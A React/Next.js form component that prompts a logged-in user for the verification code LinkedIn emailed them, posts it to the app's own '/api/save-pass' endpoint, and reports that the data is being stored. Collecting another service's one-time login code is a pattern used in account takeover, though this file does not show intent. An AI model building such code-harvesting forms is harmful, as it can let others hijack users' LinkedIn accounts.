"use client";
import { useState } from "react";
import axios from "axios";
import { useSession } from "next-auth/react";

import Input from "./input";
import Button from "./button";
import { useToastContext } from "../context/toast-context";

const SaveCodeForm = () => {
  const { data: session } = useSession();
  const [code, setCod] = useState("");
  const [codeIsSaved, setCodeIsSaved] = useState(true);

  const showToast = useToastContext();

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await axios.post("/api/save-pass", {
        code,
        userId: session.user.id,
      });

      if (response.status === 200) {
        setCodeIsSaved(false);
        showToast(response?.data.message, "success");
      }
    } catch (error) {
      showToast(error.response?.data.message, "error");
    }
  };

  return (
    <>
      {codeIsSaved ? (
        <>
          <div className="w-[100%] flex flex-col gap-[20px] mt-[16px]">
            <p className="text-center">
              Check your email and enter the verification code from LinkedIn
            </p>
            <form
              className="flex flex-row gap-8 items-center"
              onSubmit={handleSubmit}
            >
              <Input
                required
                type="text"
                value={code}
                onChange={(e) => setCod(e.target.value)}
              />
              <Button className="btn-primary" type="submit">
                <p>Send Pass</p>
              </Button>
            </form>
          </div>
        </>
      ) : (
        <>
          <p className="mt-[20px]">
            Your code has been saved successfully. We are currently storing your
            data. Wait for saving...
          </p>
        </>
      )}
    </>
  );
};

export default SaveCodeForm;
